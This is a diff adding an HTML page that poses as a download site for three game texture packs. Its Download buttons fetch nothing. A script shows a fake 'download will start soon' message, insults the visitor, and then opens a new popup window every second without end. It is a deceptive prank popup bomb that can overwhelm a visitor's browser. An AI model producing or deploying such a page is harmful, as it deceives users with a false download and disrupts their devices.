@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Better Texture Packs</title>
+    <style>
+        body {
+            background: url('https://iili.io/2LnOhhX.png') no-repeat center center fixed;
+            background-size: cover;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        .pack {
+            display: inline-block;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
+            margin: 10px;
+            border-radius: 10px;
+        }
+        img {
+            width: 200px;
+            border-radius: 10px;
+        }
+        button {
+            margin-top: 10px;
+            padding: 10px;
+            background: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Better Texture Packs</h1>
+        <div class="pack">
+            <img src="https://iili.io/2L5ZfCN.png" alt="Better Cornbread">
+            <p>Better Cornbread</p>
+            <button onclick="download()">Download</button>
+        </div>
+        <div class="pack">
+            <img src="https://iili.io/2Lowp7p.png" alt="Better Bowls">
+            <p>Better Bowls</p>
+            <button onclick="download()">Download</button>
+        </div>
+        <div class="pack">
+            <img src="https://iili.io/3CiFphx.png" alt="Better Helmets">
+            <p>Better Helmets</p>
+            <button onclick="download()">Download</button>
+        </div>
+    </div>
+
+    <script>
+        function download() {
+            alert("Your download will start soon...");
+            setTimeout(troll, 2000);
+        }
+
+        function troll() {
+            alert("YOU ARE AN IDIOT! AHAHAHAAAAA");
+            setInterval(() => {
+                window.open("https://iili.io/2LnOhhX.png", "", "width=400, height=300");
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
